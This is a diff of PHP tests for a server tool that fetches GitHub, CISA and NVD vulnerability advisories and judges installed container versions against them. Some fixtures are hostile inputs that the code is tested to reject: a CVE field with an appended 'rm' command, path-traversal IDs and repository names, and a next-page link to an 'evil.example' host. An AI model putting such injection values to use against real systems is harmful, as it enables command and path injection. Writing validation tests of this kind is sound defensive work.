+        [['>1.36.0, < 1.37.0'], ['1.37.0'], '1.36.0'], [['>1.36.0, < 1.37.0'], ['1.37.0'], '1.36.1'],
+        [['1.35.3'], ['1.35.4'], '1.35.3'], [['1.35.3'], ['1.35.4'], '1.34.0'], [['1.35.3'], ['1.35.4'], '1.36.0'],
+        [['>=10.8.0'], ['10.8.10'], '10.8.5'], [['>=10.8.0'], ['10.8.10'], '10.11.3'], [['>= 7.2'], ['TBD'], '8.4.0'],
+        [['All'], ['6.2.6, 6.0.16, 5.0.14'], '7.4.2'], [['All'], ['TBD'], '8.4.0'],
+        [['<= 9.2.0-rc2, <= 9.1.3, <= 9.0.7'], ['9.2.0, 9.1.4, 9.0.8'], '9.1.2'], [['<= 9.2.0-rc2, <= 9.1.3, <= 9.0.7'], ['9.2.0, 9.1.4, 9.0.8'], '9.2.1'],
+        [['< 2.48.3', '< 2.47.6', '< 3.2.2'], ['>= 2.48.3', '>= 2.47.6', '>= 3.2.2'], '2.48.5'], [['< 2.48.3', '< 2.47.6', '< 3.2.2'], ['>= 2.48.3', '>= 2.47.6', '>= 3.2.2'], '3.3.0'],
+        [['>= 8.3.0, < 8.3.37', '>= 8.4.0, < 8.4.28', '< 8.2.36'], ['8.3.37', '8.4.28', '8.2.36'], '8.4.15'],
+        [['>= 8.3.0, < 8.3.37', '>= 8.4.0, < 8.4.28', '< 8.2.36'], ['8.3.37', '8.4.28', '8.2.36'], '8.4.28'],
+        [['<= 17.1'], ['N/A'], '17.1.3'], [['> main@4ffa26c9'], ['> main@4eb1003'], '3.4.2'], [['< 2.4.1'], ['>= 2.5.0'], '2.4.0'], [['<1.32.6'], ['1.32.7'], '1.33.0.1'],
+        [['< 12.0'], ['12.0'], '12.4ubu2604'],
+    ];
+    same('vuln advisories: judged — affected only when the versions compare cleanly; a version alone below, an open end without a fix, a commit: unsure with their words; past every fix: not affected',
+        [['yes', '1.37.4'], ['no', '1.37.4'], ['no', '1.37.4'], ['no', '1.37.0'], ['yes', '1.37.0'], ['yes', '1.35.4'], ['maybe', null, 'ghsa', '1.35.3'], ['no', '1.35.4'],
+         // (round 2: one bound per release line read per line — Valkey 9.1.2 in its line 9.1, 9.2.1 in the rc line unsure,
+         // n8n 2.48.5 past its line's fix, 3.3.0 past 3.2.2)
+         ['yes', '10.8.10'], ['no', '10.8.10'], ['maybe', null, 'ghsa', '>= 7.2'], ['no', null], ['maybe', null, 'ghsa', 'All'],
+         ['yes', '9.1.4'], ['maybe', null, 'ghsa', '<= 9.2.0-rc2, <= 9.1.3, <= 9.0.7'], ['no', '2.48.3'], ['no', '3.2.2'],
+         ['yes', '8.4.28'], ['no', null], ['maybe', null, 'rough', '17.1'], ['maybe', null, 'ghsa', '> main@4ffa26c9'], ['yes', '2.5.0'], ['no', '1.32.7'],
+         ['maybe', null, 'ghsa', '< 12.0']],
+        array_map(fn ($c) => watchmanVulnGhsaVerdict($adv($c[0], $c[1]), $c[2]), $cases));
+
+    // reduced: only high and critical, published, the product's own packages (Nextcloud's server, never Enterprise's;
+    // Home Assistant's Core, never its Supervisor or OS), a valid id
+    $raw = [
+        ['ghsa_id' => 'GHSA-5572-968j-v7g5', 'cve_id' => 'CVE-2026-77167', 'severity' => 'high', 'state' => 'published', 'published_at' => '2026-10-27T10:00:00Z', 'summary' => 'Server: x',
+         'vulnerabilities' => [['package' => ['ecosystem' => 'nextcloud', 'name' => 'Server'], 'vulnerable_version_range' => '>= 32.0.0, < 32.0.13', 'patched_versions' => '32.0.13'],
+                               ['package' => ['ecosystem' => 'nextcloud entreprise', 'name' => 'server'], 'vulnerable_version_range' => '>=22.0.0', 'patched_versions' => '22.2.10.42'],
+                               ['package' => ['ecosystem' => 'nextcloud', 'name' => 'Deck'], 'vulnerable_version_range' => '< 1.2', 'patched_versions' => '1.2']]],
+        ['ghsa_id' => 'GHSA-6828-c7cx-hvqm', 'cve_id' => null, 'severity' => 'medium', 'vulnerabilities' => [['package' => ['name' => 'Server'], 'vulnerable_version_range' => '< 1']]],
+        ['ghsa_id' => 'GHSA-gh5m-4m97-c95h', 'severity' => 'critical', 'withdrawn_at' => '2026-01-01T00:00:00Z', 'vulnerabilities' => [['package' => ['name' => 'Server'], 'vulnerable_version_range' => '< 1']]],
+        ['ghsa_id' => 'GHSA-../x', 'severity' => 'critical', 'vulnerabilities' => [['package' => ['name' => 'Server'], 'vulnerable_version_range' => '< 1']]],
+        ['ghsa_id' => 'GHSA-wwwm-px48-fpvq', 'cve_id' => 'CVE-2026-1; rm', 'severity' => 'critical', 'vulnerabilities' => [['package' => ['name' => ''], 'vulnerable_version_range' => '< 1']]],
+    ];
+    $nc = WATCH_VULN_PRODUCTS['nextcloud']['ghsa'];
+    $ha = WATCH_VULN_PRODUCTS['homeassistant']['ghsa'];
+    $jf = WATCH_VULN_PRODUCTS['jellyfin']['ghsa'];
+    same('vuln advisories: reduced — Nextcloud\'s server only (Enterprise and Deck left out), medium, withdrawn, a bad id: none; an unnamed package only in a repository of one program; a bad CVE dropped',
+        [[['>= 32.0.0, < 32.0.13'], ['32.0.13'], 'CVE-2026-77167', '2026-10-27'], null, null, null, null, ['GHSA-wwwm-px48-fpvq', null, ['< 1']]],
+        [(fn ($r) => [$r['ranges'], $r['fixed'], $r['cve'], $r['pub']])(watchmanVulnGhsaReduce($raw[0], $nc)), watchmanVulnGhsaReduce($raw[1], $nc),
+         watchmanVulnGhsaReduce($raw[2], $nc), watchmanVulnGhsaReduce($raw[3], $nc), watchmanVulnGhsaReduce($raw[4], $nc),
+         (fn ($r) => [$r['id'], $r['cve'], $r['ranges']])(watchmanVulnGhsaReduce($raw[4], $jf))]);
+    $haRaw = ['ghsa_id' => 'GHSA-2j8f-h4mr-qr25', 'severity' => 'critical', 'vulnerabilities' => [
+        ['package' => ['name' => 'Home Assistant Supervisor'], 'vulnerable_version_range' => '<2023.03.3', 'patched_versions' => '2023.03.3'],
+        ['package' => ['name' => 'Home Assistant Core'], 'vulnerable_version_range' => '<2023.3.2', 'patched_versions' => '2023.3.2']]];
+    same('vuln advisories: Home Assistant — Core\'s range only, never the Supervisor\'s', [['<2023.3.2']], [watchmanVulnGhsaReduce($haRaw, $ha)['ranges'] ?? null]);
+    check('vuln advisories: every repository of the name table in its strict shape, every address built from it in its shape',
+        count(watchmanVulnGhsaProducts()) === count(array_filter(WATCH_VULN_PRODUCTS, fn ($p) => isset($p['ghsa'])))
+        && !array_filter(watchmanVulnGhsaProducts(), fn ($g) => watchmanVulnGhsaUrl($g['repo']) === null));
+    same('vuln advisories: an address — only the repository\'s shape, the cursor only its own characters; the Link header gives the cursor, never its address',
+        ['https://api.github.com/repos/dani-garcia/vaultwarden/security-advisories?per_page=100&sort=published&direction=desc', null, null, null,
+         'Y3Vyc29yOnYyOpK0MjAyNi0wOC0wNVQxNDoyMToxN1rOAAfzSg%3D%3D', null],
+        [watchmanVulnGhsaUrl('dani-garcia/vaultwarden'), watchmanVulnGhsaUrl('../etc'), watchmanVulnGhsaUrl('a/b?x=1'), watchmanVulnGhsaUrl('a/b', 'x&y=1'),
+         watchmanVulnGhsaNext('<https://api.github.com/repositories/193215554/security-advisories?per_page=100&sort=published&direction=desc&after=Y3Vyc29yOnYyOpK0MjAyNi0wOC0wNVQxNDoyMToxN1rOAAfzSg%3D%3D>; rel="next"'),
+         watchmanVulnGhsaNext('<https://evil.example/x?after=abc>; rel="next"')]);
+    $args = implode(' ', watchmanVulnGhsaCurl('https://api.github.com/repos/a/b/security-advisories?per_page=100&sort=published&direction=desc', 'Wed, 28 Oct 2026 18:01:28 GMT'));
+    check('vuln advisories: curl — the fixed User-Agent, GitHub\'s Accept and version, «only when newer», https only, no redirects, its size cap; nothing of this server',
+        str_contains($args, '-A UnraidSecretaryOffice') && str_contains($args, 'Accept: application/vnd.github+json') && str_contains($args, 'X-GitHub-Api-Version: 2022-11-28')
+        && str_contains($args, 'If-Modified-Since: Wed, 28 Oct 2026 18:01:28 GMT') && str_contains($args, '--proto =https') && str_contains($args, '--max-redirs 0')
+        && str_contains($args, '--max-filesize ' . WATCH_VULN_GHSA_MAX) && !str_contains($args, (string) gethostname()));
+
+    // the fetch: only products found in a container here (vuln_look.cts), paged by the cursor, at most three pages
+    $tmp = hardeningTmp('vuln-ghsa');
+    $dir = "$tmp/data";
+    $f = watchmanVulnDir($dir);
+    @mkdir("$f/ghsa", 0700, true);
+    $t0 = strtotime('2026-11-26 12:00:00');
+    writeAtomic("$f/ghsa/redis.json", jsonEncode(['v' => 1, 'fetched' => $t0 - 86400, 'repo' => 'redis/redis', 'items' => []]), 0600, 0, 0);
+    writeAtomic("$dir/state.json", jsonEncode(['vuln_look' => ['host' => [['product' => 'php', 'version' => '8.4.28']],
+        'cts' => [['where' => 'vw', 'product' => 'vaultwarden', 'version' => '1.37.3'], ['where' => 'n8n', 'product' => 'n8n', 'version' => '2.48.5'],
+                  ['where' => 'pg', 'product' => 'postgresql', 'version' => '17.12']]]]), 0600, 0, 0);
+    $vwPage = [
+        ['ghsa_id' => 'GHSA-69q9-v8p6-xvx3', 'severity' => 'high', 'published_at' => '2026-10-28T10:00:00Z', 'summary' => 'An admin token bypass',
+         'vulnerabilities' => [['package' => ['ecosystem' => 'rust', 'name' => 'vaultwarden'], 'vulnerable_version_range' => '<= 1.37.3', 'patched_versions' => '1.37.4']]],
+        ['ghsa_id' => 'GHSA-7jg8-8m5x-6j9r', 'severity' => 'medium', 'published_at' => '2026-10-28T10:00:00Z',
+         'vulnerabilities' => [['package' => ['name' => 'vaultwarden'], 'vulnerable_version_range' => '<=1.37.3', 'patched_versions' => '1.37.4']]],
+        ['ghsa_id' => 'GHSA-h6cc-rc6q-23j4', 'cve_id' => 'CVE-2025-24364', 'severity' => 'critical', 'published_at' => '2025-01-25T10:00:00Z', 'summary' => 'Old one',
+         'vulnerabilities' => [['package' => ['ecosystem' => 'docker hub', 'name' => 'vaultwarden/server'], 'vulnerable_version_range' => '<=1.32.7', 'patched_versions' => '1.33.0']]],
+        ['ghsa_id' => 'GHSA-c5rv-q295-7w4g', 'cve_id' => 'CVE-2026-43914', 'severity' => 'critical', 'published_at' => '2026-04-25T10:00:00Z', 'summary' => 'In CISA\'s list too',
+         'vulnerabilities' => [['package' => ['name' => 'vaultwarden'], 'vulnerable_version_range' => '<1.37.4', 'patched_versions' => '1.37.4']]],
+        ['ghsa_id' => 'GHSA-jjxg-p3v6-52ww', 'severity' => 'high', 'published_at' => '2026-04-26T10:00:00Z', 'summary' => 'Named alone',
+         'vulnerabilities' => [['package' => ['name' => 'vaultwarden'], 'vulnerable_version_range' => '1.38.0', 'patched_versions' => '1.38.1']]],
+    ];
+    $n8nPage = fn (int $page) => array_map(fn ($i) => ['ghsa_id' => sprintf('GHSA-%04d-n8n%d-aaaa', $i, $page), 'severity' => 'high',
+        'published_at' => sprintf('2026-%02d-%02dT10:00:00Z', 10 - $page * 3, 28 - intdiv($i, 4)), 'summary' => "n8n $page/$i",
+        'vulnerabilities' => [['package' => ['name' => 'n8n'], 'vulnerable_version_range' => '< ' . (3 - $page) . '.' . (99 - $i) . '.0', 'patched_versions' => (3 - $page) . '.' . (99 - $i) . '.0']]], range(0, 99));
+    $asked = [];
+    $get = function (string $url, ?string $since) use (&$asked, $vwPage, $n8nPage): array {
+        $asked[] = [$url, $since];
+        if (str_contains($url, '/dani-garcia/vaultwarden/')) {
+            return ['code' => 200, 'body' => json_encode($vwPage), 'lm' => 'Wed, 28 Oct 2026 18:01:28 GMT', 'err' => null, 'link' => null];
+        }
+        if (str_contains($url, '/n8n-io/n8n/')) {
+            $page = preg_match('/after=c(\d)$/', $url, $m) ? (int) $m[1] : 0;
+            return ['code' => 200, 'body' => json_encode($n8nPage($page)), 'lm' => null, 'err' => null,
+                    'link' => '<https://api.github.com/repositories/193215554/security-advisories?per_page=100&after=c' . ($page + 1) . '>; rel="next"'];
+        }
+        return ['code' => 404, 'body' => '{"message":"Not Found"}', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    [$n, $w, $err] = watchmanVulnGhsaFetch($dir, $t0, ['get' => $get], fn (): bool => true);
+    $urls = array_column($asked, 0);
+    same('vuln advisories: asked — only the containers\' products with advisories (Vaultwarden, n8n; never the server\'s PHP, never PostgreSQL), n8n three pages by its cursor, nothing more',
+        [4, 2, null, ['https://api.github.com/repos/n8n-io/n8n/security-advisories?per_page=100&sort=published&direction=desc',
+         'https://api.github.com/repos/n8n-io/n8n/security-advisories?per_page=100&sort=published&direction=desc&after=c1',
+         'https://api.github.com/repos/n8n-io/n8n/security-advisories?per_page=100&sort=published&direction=desc&after=c2',
+         'https://api.github.com/repos/dani-garcia/vaultwarden/security-advisories?per_page=100&sort=published&direction=desc'], false],
+        [$n, $w, $err, $urls, is_file("$f/ghsa/redis.json")]);
+    $vw = readJson("$f/ghsa/vaultwarden.json");
+    $n8 = readJson("$f/ghsa/n8n.json");
+    same('vuln advisories: kept reduced — Vaultwarden\'s four serious ones newest first with its Last-Modified, not cut; n8n cut at ' . WATCH_VULN_GHSA_KEEP . ' of 300 looked at, its floor said, no Last-Modified',
+        [1, ['GHSA-69q9-v8p6-xvx3', 'GHSA-jjxg-p3v6-52ww', 'GHSA-c5rv-q295-7w4g', 'GHSA-h6cc-rc6q-23j4'], 'Wed, 28 Oct 2026 18:01:28 GMT', false, 5,
+         WATCH_VULN_GHSA_KEEP, 300, true, null, true],
+        [$vw['v'], array_column($vw['items'], 'id'), $vw['lm'], $vw['cut'], $vw['looked'], count($n8['items']), $n8['looked'], $n8['cut'], $n8['lm'], is_string($n8['floor'] ?? null)]);
+    $mode = substr(sprintf('%o', fileperms("$f/ghsa/vaultwarden.json")), -3);
+    same('vuln advisories: its file only for root', '600', $mode);
+    // the next day: Vaultwarden «only when newer» (one page), 304 keeps it; n8n asked whole (cut); «slow down» ends the part
+    $asked = [];
+    $get304 = function (string $url, ?string $since) use (&$asked, $get): array {
+        $asked[] = [$url, $since];
+        return str_contains($url, '/dani-garcia/') && $since !== null ? ['code' => 304, 'body' => '', 'lm' => null, 'err' => null] : $get($url, $since);
+    };
+    watchmanVulnGhsaFetch($dir, $t0 + 86400, ['get' => $get304], fn (): bool => true, ['vaultwarden']);
+    same('vuln advisories: the next day — «only when newer» for the one-page list, 304: kept as it was, a day fresher',
+        [[['https://api.github.com/repos/dani-garcia/vaultwarden/security-advisories?per_page=100&sort=published&direction=desc', 'Wed, 28 Oct 2026 18:01:28 GMT']], $t0 + 86400, 4],
+        [$asked, readJson("$f/ghsa/vaultwarden.json")['fetched'] ?? null, count(readJson("$f/ghsa/vaultwarden.json")['items'] ?? [])]);
+    $slow = fn (string $url) => ['code' => 403, 'body' => '', 'lm' => null, 'err' => 'HTTP 403'];
+    same('vuln advisories: GitHub\'s limit without a key (403) — the part ends at once, what was kept stays', [1, 0, 'HTTP 403', true],
+        array_merge(watchmanVulnGhsaFetch($dir, $t0 + 2 * 86400, ['get' => $slow], fn (): bool => true, ['n8n', 'vaultwarden']), [is_file("$f/ghsa/vaultwarden.json")]));
+    $none = fn (string $url) => ['code' => 0, 'body' => '', 'lm' => null, 'err' => 'curl 28: Operation timed out'];
+    same('vuln advisories: two without an answer in a row — away, the rest another day; no time left — nothing asked',
+        [[2, 0, 'curl 28: Operation timed out'], [0, 0, null]],
+        [watchmanVulnGhsaFetch($dir, $t0 + 2 * 86400, ['get' => $none], fn (): bool => true, ['homeassistant', 'immich', 'n8n']),
+         watchmanVulnGhsaFetch($dir, $t0 + 2 * 86400, ['get' => $none], fn (): bool => false, ['n8n'])]);
+
+    // judged: Vaultwarden 1.37.3 in a container — two affected (the high and the newest), CISA's one left to CISA, the old
+    // one fixed, the version named alone above unsure; n8n 2.48.5 older than its cut list's floor; the server's own rows never
+    writeAtomic("$f/ghsa/vaultwarden.json", jsonEncode(['v' => 1, 'fetched' => $t0] + array_diff_key($vw, ['v' => 1, 'fetched' => 1])), 0600, 0, 0);
+    writeAtomic("$f/ghsa/n8n.json", jsonEncode(['v' => 1, 'fetched' => $t0, 'repo' => 'n8n-io/n8n', 'looked' => 300, 'cut' => true, 'floor' => '2.50.0', 'items' => []]), 0600, 0, 0);
+    $inv = [['product' => 'vaultwarden', 'version' => '1.37.3', 'clean' => '1.37.3', 'where' => 'vw'], ['product' => 'n8n', 'version' => '2.48.5', 'clean' => '2.48.5', 'where' => 'n8n'],
+            ['product' => 'jellyfin', 'version' => '12.4ubu2604-ls61', 'clean' => '12.4', 'where' => 'jf'], ['product' => 'php', 'version' => '8.4.1', 'clean' => '8.4.1', 'where' => 'host']];
+    $j = watchmanVulnGhsaJudge($dir, $inv, $t0 + 60, ['vaultwarden' => ['CVE-2026-43914']]);
+    same('vuln advisories: judged — affected critical first, CISA\'s one left out, the old one fixed, the one named alone unsure; n8n older than its kept list; Jellyfin not checked right now (shown «12.4»); never the server\'s PHP',
+        [[['GHSA-69q9-v8p6-xvx3', 'yes', 'high', '1.37.4'], ['GHSA-jjxg-p3v6-52ww', 'maybe', 'high', null]],
+         [['vaultwarden', 'vw', '1.37.3', false, false], ['n8n', 'n8n', '2.48.5', true, false], ['jellyfin', 'jf', '12.4', false, true]]],
+        [array_map(fn ($x) => [$x['id'], $x['verdict'], $x['sev'], $x['fixed']], $j['ghsa']),
+         array_map(fn ($x) => [$x['product'], $x['where'], $x['have'], !empty($x['older']), !empty($x['stale'])], $j['ghsa_here'])]);
+    same('vuln advisories: the unsure row says why — the advisory\'s own words', ['ghsa', '1.38.0'], [$j['ghsa'][1]['why'] ?? null, $j['ghsa'][1]['bound'] ?? null]);
+    // the tip: per container and program one line, closed from the highest fixed version; «I know» comes back with a new advisory
+    $tips = [];
+    $add = function (string $id, array $p, string $about, ?array $link) use (&$tips): void { $tips[$id] = [$p, $about, $link['to'] ?? null]; };
+    watchmanVulnTips(['ghsa' => $j['ghsa']], $add);
+    same('vuln advisories: the tip software_vuln — advice, its area «Known vulnerabilities», one line for Vaultwarden 1.37.3 (vw), closed from 1.37.4, to Docker',
+        [['names' => 'Vaultwarden 1.37.3 (vw)', 'n' => 1, 'items' => [['product' => 'Vaultwarden', 'where' => 'vw', 'have' => '1.37.3', 'n' => 1, 'fixed' => '1.37.4']]],
+         'docker', 'advice', 'vuln'],
+        [$tips['software_vuln'][0] ?? null, $tips['software_vuln'][2] ?? null, WATCH_POSTURE['software_vuln'], watchmanCatOfTip('software_vuln')]);
+    $about = $tips['software_vuln'][1] ?? '';
+    $more = $j['ghsa'];
+    $more[] = ['id' => 'GHSA-zzzz-zzzz-zzzz', 'product' => 'vaultwarden', 'where' => 'vw', 'have' => '1.37.3', 'sev' => 'critical', 'verdict' => 'yes', 'fixed' => null];
+    watchmanVulnTips(['ghsa' => $more], $add);
+    same('vuln advisories: a new advisory — another signature (the tip comes back after «I know, thanks»), one without a fix: «not all closed»',
+        [true, null, 2], [$about !== $tips['software_vuln'][1], $tips['software_vuln'][0]['items'][0]['fixed'], $tips['software_vuln'][0]['items'][0]['n']]);
+    watchmanVulnTips(['ghsa' => [['verdict' => 'maybe'] + $j['ghsa'][1]]], function (string $id) { check("vuln advisories: no tip from an unsure row ($id)", $id !== 'software_vuln'); });
+    // the page: rows only in their shape, named; an older state has none
+    $page = watchmanVulnPage(['vuln_on' => true], ['kev' => $t0, 'ghsa' => array_merge($j['ghsa'], [['id' => 'GHSA-../', 'product' => 'vaultwarden', 'where' => 'vw', 'verdict' => 'yes'],
+        ['id' => 'GHSA-aaaa-bbbb-cccc', 'product' => 'nope', 'where' => 'x', 'verdict' => 'yes'], 'junk']), 'ghsa_here' => $j['ghsa_here']]);
+    same('vuln advisories: the page — the two rows named, the odd ones dropped; what he read per program; an older state: none',
+        [['Vaultwarden', 'Vaultwarden'], 3, [[], []]],
+        [array_column($page['ghsa'], 'label'), count($page['ghsa_here']), array_values(array_intersect_key(watchmanVulnPage(['vuln_on' => true], ['kev' => $t0]), ['ghsa' => 1, 'ghsa_here' => 1]))]);
+
+    // a build and a label as the page shows them (the coordinator's addition, 2026-11-26): DSM's build flagged, the label cleaned
+    $look = watchmanVulnPage(['vuln_on' => true], ['kev' => $t0, 'cts' => [['where' => 'nas', 'product' => 'synology', 'version' => '90080'],
+        ['where' => 'jf', 'product' => 'jellyfin', 'version' => '12.4ubu2604-ls61'], ['where' => 'jf2', 'product' => 'jellyfin', 'version' => '12.4'],
+        ['where' => 'new', 'product' => 'jellyfin', 'version' => '12.4ubu2604-ls61', 'clean' => '12.4']],
+        'unsure' => [['cve' => 'CVE-2026-96652', 'product' => 'plex', 'where' => 'plex', 'have' => '1.42.2.10156-f737b826c-ls280', 'why' => 'lower', 'bound' => '1.42.2.10156-f737b826c-ls280']]]);
+    same('vuln advisories: DSM\'s value a build (state unchanged), a label shown cleaned — the same «12.4» from every image, an older state\'s row too; Plex\'s unsure row «1.42.2.10156»',
+        [[true, '90080', null], [null, '12.4ubu2604-ls61', '12.4'], [null, '12.4', null], [null, '12.4ubu2604-ls61', '12.4'], '1.42.2.10156'],
+        [...array_map(fn ($x) => [$x['build'] ?? null, $x['version'], $x['shown'] ?? null], $look['cts']), $look['unsure'][0]['shown'] ?? null]);
+    $rows = watchmanVulnLook([['product' => 'jellyfin', 'version' => '12.4ubu2604-ls61', 'clean' => '12.4', 'where' => 'jf']], ['jf']);
+    same('vuln advisories: «What he checked» keeps the raw label and adds the version as judged', [['where' => 'jf', 'product' => 'jellyfin', 'version' => '12.4ubu2604-ls61', 'clean' => '12.4']], $rows['cts']);
+
+    // the job: status.json from its start (an interrupted job keeps its day), the records' part bound in time, the
+    // projects' advisories after NVD with their own source status
+    $d2 = "$tmp/job";
+    @mkdir($d2, 0700, true);
+    $kevBig = ['vulnerabilities' => array_map(fn ($i) => ['cveID' => sprintf('CVE-2024-%05d', 10000 + $i), 'vendorProject' => 'Linux', 'product' => 'Kernel'], range(1, 120))];
+    $t = 0.0;
+    $recs = 0;
+    $statusSeen = null;
+    $jobGet = function (string $url) use ($kevBig, &$recs, &$t, &$statusSeen, $d2): array {
+        if ($url === WATCH_VULN_URLS['kev']) {
+            $statusSeen = readJson(watchmanVulnDir($d2) . '/status.json')['run'] ?? null;      // written before the first request
+            return ['code' => 200, 'body' => json_encode($kevBig), 'lm' => null, 'err' => null];
+        }
+        if (str_contains($url, 'cvelistV5')) {
+            $recs++;
+            $t += 40;           // a slow line: 40 s each
+            return ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+        }
+        return ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    $r = watchmanVulnFetch($d2, ['now' => $t0, 'get' => $jobGet, 'sleep' => fn () => null, 'clock' => function () use (&$t): float { return $t; }, 'ghsa_products' => []]);
+    same('vuln advisories, the job: its day in status.json before the first request; the records\' part stops at WATCH_VULN_CVE_TIME (40 s a record: 6 of 60), the rest the next day',
+        [$t0, 6, true], [$statusSeen, $recs, isset(readJson(watchmanVulnDir($d2) . '/status.json')['eol'])]);
+    check('vuln advisories, the job: due no more the same day although it was stopped (its day kept)', !watchmanVulnDue(['vuln_on' => true], ['run' => $t0], $t0 + 600));
+
+    // Plex 1.43.4.10903 and CVE-2020-5741 (a test server, 2026-11-26): its record names «Plex Media Server (Windows)» of vendor
+    // «n/a» — no item of the product, can't be checked; it was pending at the last round (its record came in this job), so
+    // NVD waited a day more. Now asked in the same job, and NVD's «< 1.19.3» says: not affected (a lower bound past every fix)
+    $d3 = "$tmp/plex";
+    @mkdir(watchmanVulnDir($d3) . '/cve', 0700, true);
+    $plexRec = ['cveMetadata' => ['cveId' => 'CVE-2020-5741', 'datePublished' => '2020-05-08T12:02:59.000Z'], 'containers' => ['cna' => ['affected' => [
+        ['product' => 'Plex Media Server (Windows)', 'vendor' => 'n/a', 'versions' => [['status' => 'affected', 'version' => 'Versions prior to 1.19.3']]]]]]];
+    $plexNvd = ['vulnerabilities' => [['cve' => ['id' => 'CVE-2020-5741', 'published' => '2020-05-08T13:15:11.000', 'configurations' => [['operator' => 'AND', 'nodes' => [
+        ['operator' => 'OR', 'negate' => false, 'cpeMatch' => [['vulnerable' => true, 'criteria' => 'cpe:2.3:a:plex:media_server:*:*:*:*:*:*:*:*', 'versionEndExcluding' => '1.19.3']]],
+        ['operator' => 'OR', 'negate' => false, 'cpeMatch' => [['vulnerable' => false, 'criteria' => 'cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*']]]]]]]]]];
+    $kevPlex = ['vulnerabilities' => array_merge([['cveID' => 'CVE-2020-5741', 'vendorProject' => 'Plex', 'product' => 'Media Server', 'vulnerabilityName' => 'Plex Media Server Remote Code Execution', 'dateAdded' => '2023-03-10']],
+        array_map(fn ($i) => ['cveID' => sprintf('CVE-2023-%05d', 50000 + $i), 'vendorProject' => 'Example', 'product' => "X$i"], range(1, 120)))];
+    writeAtomic("$d3/state.json", jsonEncode(['vuln_look' => ['pending' => ['CVE-2020-5741'], 'unsure' => [],
+        'cts' => [['where' => 'plex', 'product' => 'plex', 'version' => '1.43.4.10903-e5521bd8c', 'clean' => '1.43.4.10903']]]]), 0600, 0, 0);
+    $nvdAsked = [];
+    $plexGet = function (string $url) use ($plexRec, $plexNvd, $kevPlex, &$nvdAsked): array {
+        if ($url === WATCH_VULN_URLS['kev']) {
+            return ['code' => 200, 'body' => json_encode($kevPlex), 'lm' => null, 'err' => null];
+        }
+        if (str_ends_with($url, '/CVE-2020-5741.json')) {
+            return ['code' => 200, 'body' => json_encode($plexRec), 'lm' => null, 'err' => null];
+        }
+        if (str_contains($url, 'nvd.nist.gov')) {
+            $nvdAsked[] = substr($url, strrpos($url, '=') + 1);
+            return ['code' => 200, 'body' => json_encode($plexNvd), 'lm' => null, 'err' => null];
+        }
+        return ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    $images = ['plex' => ['OCI:plex' => '1.43.4.10903-e5521bd8c']];
+    $inv3 = watchmanVulnInventory(['php' => '8.4.28', 'kernel' => '6.12.54-Unraid', 'vuln_images' => $images]);
+    writeAtomic(watchmanVulnDir($d3) . '/kev.json', jsonEncode(['v' => 1, 'fetched' => $t0, 'count' => 121, 'entries' => [['cve' => 'CVE-2020-5741', 'product' => 'plex', 'name' => 'Plex', 'added' => '2023-03-10']]]), 0600, 0, 0);
+    writeAtomic(watchmanVulnDir($d3) . '/status.json', jsonEncode(['kev' => ['try' => $t0, 'ok' => $t0]]), 0600, 0, 0);
+    $before = watchmanVulnJudge($d3, $inv3, $t0 + 60, $images);
+    watchmanVulnFetch($d3, ['now' => $t0 + 120, 'get' => $plexGet, 'sleep' => fn () => null, 'ghsa_products' => []]);
+    $after = watchmanVulnJudge($d3, $inv3, $t0 + 180, $images);
+    same('vuln advisories, Plex: pending before; its record came in the job — NVD asked the same day; then not affected (fixed from 1.19.3, by NVD), never unsure',
+        [['CVE-2020-5741'], ['CVE-2020-5741'], [['CVE-2020-5741', 'plex', '1.19.3', 'nvd']], []],
+        [$before['pending'], $nvdAsked, array_map(fn ($x) => [$x['cve'], $x['where'], $x['fixed'], $x['src'] ?? null], $after['not']), $after['unsure']]);
+    // the record alone (NVD not asked yet): unsure, nvd false — as the test server showed it
+    @unlink(watchmanVulnDir($d3) . '/nvd/CVE-2020-5741.json');
+    same('vuln advisories, Plex: the record alone — can\'t be checked for sure, NVD still to ask', [['CVE-2020-5741', false]],
+        array_map(fn ($x) => [$x['cve'], $x['nvd']], watchmanVulnJudge($d3, $inv3, $t0 + 180, $images)['unsure']));
+}
+
+/**
+ * The projects' advisories, round 2 (2026-11-26, from the first real runs): a list with one bound per release line read per
+ * line (Valkey, Redis, Nextcloud, n8n — the real items), wordings that mean a bound («and below», «=>»), and words that
+ * can't be compared but carry a CVE decided by its CVE record, then NVD — fetched after the exploited list's own, and
+ * still wanted once settled (or the row would come back the next day).
+ */
+function testWatchmanVulnAdvisoryLines(): void
+{
+    $vk1 = [['<= 9.2.0-rc2, <= 9.1.3, <= 9.0.7, <= 8.1.11, <= 8.0.12, <= 7.2.15'], ['9.2.0, 9.1.4, 9.0.8, 8.1.12, 8.0.13, 7.2.16']];     // GHSA-3885-pq5f-788j
+    $vk2 = [['<= 9.2.0-rc1, <= 9.1.2, <= 9.0.6, <= 8.1.10, <= 8.0.11, <= 7.2.14'], ['9.2.0-rc2, 9.1.3, 9.0.7, 8.1.11, 8.0.12, 7.2.15']];   // GHSA-f4q9-j22m-xqq9
+    $vk3 = [['<= 9.1.1, <= 9.0.5, <= 8.1.9, <= 8.0.10'], ['9.1.2, 9.0.6, 8.1.10, 8.0.11']];                                                 // GHSA-jcj7-v34w-v9vv
+    $rd = [['>= 2.8.18'], ['6.2.16, 7.2.6, 7.4.1']];                                                                                        // GHSA-whxg-wx83-85p5
+    $vk4 = [['>= 7.2'], ['7.2.9, 8.0.3, 8.1.1']];                                                                                           // GHSA-24vm-hv6g-2mj5
+    $vk5 = [['7.2.10 and below, 8.0.5 and below, 8.1.3 and below'], ['7.2.11 and above, 8.0.6 and above, 8.1.4 and above']];               // GHSA-9rfg-jx7v-52p6
+    $vk6 = [['=>9.0.0, <= 9.0.2'], ['9.0.3']];                                                                                              // GHSA-93p9-5vc7-8wgr
+    $n8n = [['< 2.48.3', '< 2.47.6', '< 3.2.2'], ['>= 2.48.3', '>= 2.47.6', '>= 3.2.2']];
+    $nc = [['>=32.0.0, >=33.0.0, >=34.0.0'], ['32.0.13, 33.0.7, 34.0.2']];
+    $all = [['All'], ['6.2.20, 7.2.11, 7.4.6, 8.0.4, 8.2.2']];
